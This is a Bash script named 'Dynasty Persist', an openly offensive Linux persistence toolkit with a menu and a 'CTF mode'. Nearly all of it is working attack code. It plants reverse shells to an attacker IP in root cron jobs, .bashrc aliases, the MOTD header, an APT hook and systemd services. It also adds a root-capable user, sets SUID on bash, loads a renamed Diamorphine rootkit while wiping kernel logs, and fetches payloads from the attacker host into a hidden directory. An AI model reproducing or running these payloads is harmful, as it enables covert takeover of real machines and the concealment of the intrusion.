#!/bin/bash


################################################ 
#                                              #    
#        Title: Dynasty Persist                #  
#        Author: Trevohack                     # 
#        Date: 1.14.2024                       #  
#        Version: 1.4.2                        # 
#                                              # 
################################################ 

echo "$ip"

helpmenu() {
    echo -e "\e[1m
        ──────────────────────────────────────────────────
            \e[96mD Y N A S T Y  - P E R S I S T\e[0m
        ──────────────────────────────────────────────────

        { ─────────────────────────────────────────────── }

                         U . S . A . G . E 
            ./dynasty.sh <ip> <port> <mode> 
            ./dynasty.sh 10.10.110.101 9999 normal
            ./dynasty.sh ctf 

        { ─────────────────────────────────────────────── } 

        \e[93m1. [ Tested on Debian Systems ]\e[0m

        \e[93m1. Basrc Persistence:\e[0m
        Maintain persistence: When a user authenticates.

        \e[93m2. Cronjob Persistence:\e[0m
        Schedule tasks for persistence.

        \e[93m3. Custom User with Root:\e[0m
        Create a root privileged user account.

        \e[93m4. RCE Persistence:\e[0m
        Remote Code Execution capabilities through a web server.

        \e[93m5. Custom LKM/Rootkit:\e[0m
        Implement custom kernel modules or rootkits / Diamorphine.

        \e[93m6. SSH Key Generation:\e[0m
        Generate SSH keys for secure authentication for every user.

        \e[93m7. Systemd Service for Root:\e[0m
        Configure root-level service for persistence.

        \e[93m8. LD_PRELOAD Privilege Escalation:\e[0m
        Special Thanks to @MatheuzSec for this.

        \e[93m9. Backdooring Message Of The Day / Linux Header:\e[0m
        Backdoor the Linux header on 00-header on the update-motd framework

        \e[93m10. Modify A Systemd Service for Persistence:\e[0m
        Modify a present systemd service for a reverse shell / persistence 

        \e[93m10. Backdoor APT command:\e[0m
        Backdoors apt command, to pop up a shell 

        ───────────────────DYNASTY───────────────────\e[0m"


}


RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
RESET='\033[0m'

ip="$1"
port="$2"
mode="$3"

newUser() {
    echo -e "\033[0;32m[+] - New User Config " && echo -e "\n"
    echo -e "\033[0;32m[+] - Enter a name for the new user: "
    read Newuser 
    adduser $Newuser 
    usermod -aG sudo $Newuser 
    chmod u+s /bin/bash
    echo -e "${RESET}"
}


sshConfig() {
    for user_dir in /home/*; do
        if [[ -d "$user_dir" && ! -L "$user_dir" && "$(basename "$user_dir")" != "lost+found" ]]; then
        username=$(basename "$user_dir")
            if [[ ! -f "$user_dir/.ssh/id_rsa" && ! -f "$user_dir/.ssh/id_rsa.pub" ]]; then
                echo "Generating SSH keys for user: $username"
                sudo -u "$username" ssh-keygen -t rsa -b 4096 -N "" -f "$user_dir/.ssh/id_rsa"
            else
                echo "SSH keys already exist for user: $username"
            fi
        fi
    done 
    echo -e "\033[0;32m[+] - SSH key generation complete."
    echo -e "${RESET}"

}

ServiceOnSystemd() {
    echo -e "\033[0;32m[+] - Systemd Root Service setting up ...\n"
    echo "Enter the full path of the script: "
    read scrip
    echo "Enter the command to run: "
    read exec 
    if [ -z "$script" ]; then
        script="exec.sh"
    fi
    if [ -z "$exec" ]; then
        exec="sudo bash"
    fi
    local CONFIG_CONTENT="[Unit]
Description=Dynasty Persist

[Service]
ExecStart=${exec} ${script}
Restart=always
RestartSec=30

[Install]
WantedBy=default.target"

    echo "$CONFIG_CONTENT" | sudo tee /etc/systemd/system/rshell.service > /dev/null 

    systemctl daemon-reload
    systemctl enable rshell.service 
    systemctl start rshell.service 

    echo -e "\033[0;32m[+] - Systemd Root Level Service successfully configued!"
    echo -e "${RESET}"
}

ModServiceOnSystemd() {
    echo -e "\033[0;32m[+] - Modify Systemd Service for Persistence"
    read -p "Enter the location of the service: " loca
    sed -i "/^ExecStart=/c\ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" "$loca"
    if grep -q "ExecStartPre" "$service_file"; then
        sed -i "s/^ExecStartPre=.*/ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" "$loca"
        echo "ExecStartPre present! ExecStartPre was modified!\n\n"
    else
        echo "No ExecStartPre present! ExecStart was modified!\n\n"
    fi
    echo -e "\033[0;32m[+] - Modified Root level setup successfully!"
    echo -e "${RESET}"
}

cronJobs() {
    echo -e "\033[0;32m[+] - Setting up cronjobs for persistence ... " && echo -e "\n"
    comandx="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
    command2="/usr/bin/python -c \"import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ip', $port));subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\""
    command3="/usr/bin/python3 -c \"import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ip', $port));subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\""
    echo "* * * * * root $comandx" | sudo tee -a /etc/crontab 
    echo "* * * * * root $command2" | sudo tee -a /etc/crontab 
    echo "* * * * * root $command3" | sudo tee -a /etc/crontab 
    echo -e "\033[0;32m[+] - Cronjobs successfully started."
    echo -e "${RESET}"
}

bashrc() {
    echo -e "\033[0;32m[+] - Configuring ~/.bashrc for persistence ... " && echo -e "\n"
    command0="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
    command="nc -e /bin/sh $ip $port"
    for user in /home/*; do
        if [ -d "$user" ]; then
          echo "$command" >> "$user/.bashrc"
          echo "$command0" >> "$user/.bashrc"
          echo 'alias cat=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'' >> "$user/.bashrc" 
          echo 'alias find=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'' >> "$user/.bashrc"
        fi
    done 
    echo "$command0" >> "/root/.bashrc"
    echo "$command" >> "/root/.bashrc"
    echo 'alias cat=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'' >> "/root/.bashrc" 
    echo 'alias find=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'' >> "/root/.bashrc" 
    echo -e "\033[0;32m[+] - Bashrc persistence added!"
    echo -e "${RESET}"
}

configDiamorphine() {
    echo -e "\033[0;32m[+] - Rootkit Configuration"
    mkdir -p /var/tmp/.memory
    git clone https://github.com/m0nad/Diamorphine /var/tmp/.memory
    mv /var/tmp/.memory/diamorphine.c /var/tmp/.memory/root.c 
    mv /var/tmp/.memory/diamorphine.h /var/tmp/.memory/root.h
    sed -i 's/diamorphine_secret/dynasty/g' /var/tmp/.memory/root.h
    sed -i 's/diamorphine/dynasty/g' /var/tmp/.memory/root.h
    make -C /var/tmp/.memory
    sed -i 's/diamorphine.h/root.h/g' /var/tmp/.memory/root.c
    sed -i 's/diamorphine_init/root_init/g' /var/tmp/.memory/root.c 
    sed -i 's/diamorphine_cleanup/root_clean/g' /var/tmp/.memory/root.c
    sed -i 's/diamorphine.o/root.o/g' /var/tmp/.memory/Makefile
    insmod /var/tmp/.memory/root.ko
    make clean -C /var/tmp/.memory
    rm -rf /var/tmp/.memory
    dmesg -C 
    echo "Nothing to see here ... " > /var/log/kern.log
    echo -e "\033[0;32m[+] - Rootkit configured successfully ${RESET}"
}

LDPreloadPrivesc() {
    echo -e "\033[0;32m[+] - LD_PRELOAD Privilege Escalation\n"
    chmod +x preload.sh
    ./preload.sh
    echo -e "\033[0;32m[+] - Configured!\n"
    echo -e "${RESET}"
}

rcePersistence() {
    echo -e "\033[0;32m[+] - RCE Persistence\n"
    PORT=9056 
    mkdir /var/www/html/dynasty_rce 
    cp rce.php /var/www/dynasty_rce/rce.php 
    cd /var/www/html/dynasty_rce 
    nohup php -S 0.0.0.0:$PORT > /dev/null 2>&1 & 
    echo -e "\033[0;32m[+] - RCE on $PORT\n" 
    echo -e "${RESET}"
}

MessageOfTheDay() {
    echo -e "\033[0;32m[+] - Linux header / Message Of The Day Persistence\n"
    echo "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" >> /etc/update-motd.d/00-header 
    echo "nc -e /bin/sh $ip $port" >> /etc/update-motd.d/00-header 
    echo "$python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'' >> /etc/update-motd.d/00-header"
    echo -e "\033[0;32m[+] - Success!"
    echo -e "${RESET}"
}

backdoorApt() {
    echo -e "\033[0;32m[+] - Backdoor APT\n"
    revshell="sh -i >& /dev/tcp/$ip/$port 0>&1"
    echo "APT::Update::Pre-Invoke {"nohup sh -i >& /dev/tcp/$ip/$port 0>&1 2> /dev/null &"};" > /etc/apt/apt.conf.d/42backdoor 
    echo -e "\033[0;32m[+] - APT is now spooky!\n"
    echo -e "${RESET}"
}

ctf_Mode() {
    clear  

    echo -e "\033[0;32m[+] - ENTERING CTF MODE\n"
    read -p "Enter ATTACKER IP: " attacker_ip 
    read -p "Enter ATTACKER PORT: " attacker_port
    read -p "Enter VICTIM IP: " victim_ip 
    read -p "Enter VICTIM PWD: " victim_pwd 
    read -p "Enter VICTIM SSH PORT: " victim_port
    

    sshpass -p "$victim_pwd" ssh -o StrictHostKeyChecking=no -p "$victim_port" root@"$victim_ip" "bash -s" <<EOF 
        mkdir /boot/grub/.grub 
        cd /boot/grub/.grub 
        wget $attacker_ip:80/rce.php 
        wget $attacker_ip:80/exec.sh
        wget $attacker_ip:80/preload.sh
        echo -e "\n"

        echo -e "\033[0;32m[+] - Setting up cronjobs for persistence ... " && echo -e "\n"
        comandx="/bin/bash -c 'bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1'"
        command2="/usr/bin/python -c \"import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$attacker_ip', $attacker_port));subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\""
        command3="/usr/bin/python3 -c \"import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$attacker_ip', $attacker_port));subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\""
        echo "* * * * * root $comandx" | sudo tee -a /etc/crontab 
        echo "* * * * * root $command2" | sudo tee -a /etc/crontab 
        echo "* * * * * root $command3" | sudo tee -a /etc/crontab 
        echo -e "\033[0;32m[+] - Cronjobs successfully started.\n"

        echo -e "\033[0;32m[+] - RCE Persistence\n"
        PORT=9056 
        mkdir /var/www/html/dynasty_rce 
        # cp /boot/grub/.grub/rce.php /var/www/dynasty_rce/rce.php 
        cd /var/www/html/dynasty_rce 
        nohup php -S 0.0.0.0:$PORT > /dev/null 2>&1 & 
        echo -e "\033[0;32m[+] - RCE on $PORT\n" 

        echo -e "\033[0;32m[+] - Configuring ~/.bashrc for persistence ... " && echo -e "\n"
        command0="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
        command="nc -e /bin/sh $ip $port"
        for user in /home/*; do
            if [ -d "$user" ]; then
                echo "$command" >> "$user/.bashrc"
                echo "$command0" >> "$user/.bashrc"
                echo 'alias cat=/bin/bash -c 'bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1'' >> "$user/.bashrc" 
                echo 'alias find=/bin/bash -c 'bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1'' >> "$user/.bashrc"
            fi
        done
            echo "$command0" >> "/root/.bashrc"
            echo "$command" >> "/root/.bashrc"
            echo 'alias cat=/bin/bash -c 'bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1'' >> "/root/.bashrc" 
            echo 'alias find=/bin/bash -c 'bash -i >& /dev/tcp/$attacker_ip/$port 0>&1'' >> "/root/.bashrc" 
            echo -e "\033[0;32m[+] - Bashrc persistence added!\n"

        echo -e "\033[0;32m[+] - Linux header / Message Of The Day Persistence\n"
        echo "bash -c 'bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1'" >> /etc/update-motd.d/00-header 
        echo "nc -e /bin/sh $attacker_ip $attacker_port" >> /etc/update-motd.d/00-header 
        echo "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$attacker_ip",$attacker_port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'' >> /etc/update-motd.d/00-header"
        echo -e "\033[0;32m[+] - Success!"
        exit
EOF
}

payloads() {
    echo -e """              
    [${RED}1${RESET}] SSH Key Generation                        
    [${RED}2${RESET}] Cronjob Persistence                      
    [${RED}3${RESET}] Custom User with Root
    [${RED}4${RESET}] RCE Persistence 
    [${RED}5${RESET}] LKM/Rootkit
    [${RED}6${RESET}] Bashrc Persistence 
    [${RED}7${RESET}] Systemd Service for Root
    [${RED}8${RESET}] LD_PRELOAD Privilege Escalaion Config                 
    [${RED}9${RESET}] Backdooring Message of the Day / Header 
    [${RED}10${RESET}] Modify An Existing Systemd Service 
    [${RED}11${RESET}] Backdoor APT 
    ${RESET}
    """ 
}

main() {
    
    if [[ $(id -u) -ne "0" ]]; then
        echo "[RED] This script should run as root!" >&2 
        exit 1
    fi

    echo -e """ 

    ${RED}
               /\                                                 /?
     _         )( ______________________   ______________________ )(         _   
    (_)///////(**)______________________> <______________________(**)///////(_)
               )(                                                 )(
               \/                                                 \? 


                                ${YELLOW} ~ DynastyPersist ~
                                   [ By: Trevohack ] ${RESET}        
""" 
    while true; do
        read -p "Dynasty > " input
        payload=$(echo "$input" | grep -oP '^use\s+\K\d+')

        if [ "$input" == "exit" ]; then
            echo -e "${GREEN}[SUCCESS] Exiting the Dynasty${RESET}"
            break
        elif [ "$input" == "show payloads" ]; then
            payloads
        elif [ "$payload" == "1" ]; then
            sshConfig
        elif [ "$payload" == "2" ]; then
            cronJobs
        elif [ "$payload" == "3" ]; then
            newUser
        elif [ "$payload" == "4" ]; then
            rcePersistence
        elif [ "$payload" == "5" ]; then
            configDiamorphine
        elif [ "$payload" == "6" ]; then
            bashrc 
        elif [ "$payload" == "7" ]; then
            ServiceOnSystemd 
        elif [ "$payload" == "8" ]; then
            LDPreloadPrivesc 
        elif [ "$payload" == "9" ]; then
            MessageOfTheDay
        elif  [ "$payload" == "10" ]; then
            ModServiceOnSystemd 
        elif  [ "$payload" == "11" ]; then
            backdoorApt
        elif [ "$payload" == "options" ] || [ payload == "help" ] || [ payload == "h" ] || [ payload == "show options" ]; then
            helpmenu 
        else 
            echo -e "${RED}[ERROR] Invalid command!"
            echo -e "${RESET}"
        fi
   done 
} 

if [ $# -eq 1 ] && [ "$1" == "ctf" ]; then
    clear
    ctf_Mode
elif [ $# -eq 3 ] && [ "$3" == "console" ]; then
    clear 
    main
else
    helpmenu 
fi
